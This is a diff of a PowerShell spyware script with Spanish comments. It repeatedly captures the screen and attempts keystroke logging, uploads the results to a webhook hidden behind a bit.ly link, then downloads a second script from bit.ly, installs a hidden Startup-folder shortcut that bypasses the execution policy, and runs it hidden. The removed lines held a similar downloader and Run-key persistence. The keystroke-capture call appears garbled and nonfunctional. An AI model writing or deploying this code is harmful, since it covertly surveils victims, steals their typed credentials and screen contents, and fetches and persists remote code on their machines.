@@ -1,3 +1,8 @@
+# Instalar el módulo Windows Input Simulator si no está instalado
+if (-not (Get-Module -Name WindowsInput)) {
+    Install-Module -Name WindowsInput -Scope CurrentUser -Force
+}
+
 $hookurl = "https://bit.ly/chu_kbras"
 $seconds = 30 # Intervalo entre capturas
 $a = 0 # Contador de imágenes enviadas al webhook
@@ -6,30 +11,11 @@ $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 # Detección de URL acortada
 if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
 
-# Verificar si el archivo principal ya existe
-$syswPath = "$env:USERPROFILE\sysw.ps1"
-if (!(Test-Path $syswPath)) {
-    # Descargar el script principal
-    $syswUrl = "https://bit.ly/Screen_dc"
-    Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
-}
-
-# Descargar el nuevo archivo
-$newFilePath = "$env:USERPROFILE\newFile.ps1"
-Invoke-WebRequest -Uri "https://bit.ly/3HVDrbb" -OutFile $newFilePath
-
-# Establecer la política de ejecución para el nuevo archivo
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-
-# Agregar entrada al Registro de Windows para ejecutar el script al iniciar sesión
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "MyScript"
-$regValue = $newFilePath
-if (!(Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
-    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
-}
+# Importar el módulo Windows Input Simulator
+Import-Module WindowsInput
 
 do {
+    # Capturar la pantalla
     $Filett = "$env:temp\SC.png"
     Add-Type -AssemblyName System.Windows.Forms
     Add-type -AssemblyName System.Drawing
@@ -42,10 +28,35 @@ do {
     $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-    Start-Sleep 1
-    curl.exe -F "file1=@$filett" $hookurl
-    Start-Sleep 1
-    Remove-Item -Path $filett
+
+    # Capturar pulsaciones de teclado
+    $Keyboard = [WindowsInput.WindowsInputExtensions]::Simulate
+    $text = $Keyboard::Capture()
+    
+    # Enviar la imagen y el texto al webhook
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $body = @"
+--$boundary
+Content-Disposition: form-data; name="file"; filename="screenshot.png"
+Content-Type: image/png
+
+$Filett
+--$boundary
+Content-Disposition: form-data; name="text"
+
+$text
+--$boundary--
+"@
+
+    $headers = @{
+        "Content-Type" = "multipart/form-data; boundary=$boundary"
+    }
+
+    Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -Body $body
+
+    # Eliminar la captura de pantalla
+    Remove-Item -Path $Filett
+
     Start-Sleep $seconds
 
     # Incrementar contador de imágenes enviadas al webhook
@@ -53,20 +64,21 @@ do {
 
     # Verificar si se ha alcanzado la cantidad máxima de imágenes
     if ($a -eq $maxImages) {
-        # Ejecutar el nuevo archivo descargado de manera oculta
-        $scriptExtension = [System.IO.Path]::GetExtension($newFilePath)
-        if ($scriptExtension -eq ".ps1") {
-            # Verificar si el archivo se puede ejecutar como script de PowerShell
-            $isPS1Script = Test-ScriptFile $newFilePath
-            if ($isPS1Script) {
-                # Ejecutar el archivo como script de PowerShell
-                Start-Process powershell.exe -ArgumentList "-NoNewWindow -WindowStyle Hidden -File `"$newFilePath`"" -WindowStyle Hidden
-            } else {
-                Write-Host "El archivo '$newFilePath' no es un script de PowerShell válido."
-            }
-        } else {
-            Write-Host "El archivo '$newFilePath' no tiene la extensión .ps1."
-        }
+        # Descargar el script principal
+        $syswUrl = "https://bit.ly/Screen_dc"
+        $syswPath = "$env:USERPROFILE\sysw.ps1"
+        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
+        
+        # Crear acceso directo en la carpeta de inicio del usuario
+        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
+        $shell = New-Object -ComObject WScript.Shell
+        $shortcut = $shell.CreateShortcut($shortcutLocation)
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
+        $shortcut.Save()
+        
+        # Ejecutar el script principal de manera oculta
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`"" -WindowStyle Hidden
         
         # Reiniciar contador de imágenes
         $a = 0
